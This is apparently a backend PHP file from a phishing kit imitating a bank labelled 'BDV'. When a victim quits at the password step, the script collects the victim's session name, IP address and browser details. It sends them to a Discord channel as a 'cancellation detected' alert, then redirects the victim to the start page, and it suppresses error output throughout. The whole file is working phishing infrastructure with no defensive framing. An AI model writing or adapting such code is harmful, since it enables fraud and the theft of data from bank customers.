<?php
error_reporting(0);
require 'discord_config.php'; 

// 2. OBTENER DATOS DEL USUARIO
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
$nombre = isset($_SESSION['nombre']) ? $_SESSION['nombre'] : 'Desconocido'; 

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// 3. CONSTRUCCIÓN DEL EMBED y ENVÍO A DISCORD
$fields = [];
$fields[] = ['name' => '👤 Usuario', 'value' => "`{$nombre}`", 'inline' => false];

$fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => '', 'inline' => false];
$fields[] = ['name' => '🌐 IP', 'value' => "`{$ip}`", 'inline' => true];
$fields[] = ['name' => '📱 Navegador', 'value' => "`{$userAgent}`", 'inline' => true];

// Estructura del Embed
$embed = [
    'title' => '🛑 BDV - CANCELACIÓN DETECTADA',
    'description' => "**Acción:** El usuario canceló en la fase de Contraseña. 🚫🔒",
    'color' => 16711680, // Rojo
    'fields' => $fields,
    'timestamp' => date('c')
];

// Llamada a la función centralizada
sendToDiscordEmbed([$embed], 'Aviso de Cancelación'); 

// 4. REDIRIGIR AL SIGUIENTE PASO
header('Location: index.php'); 
exit();
?>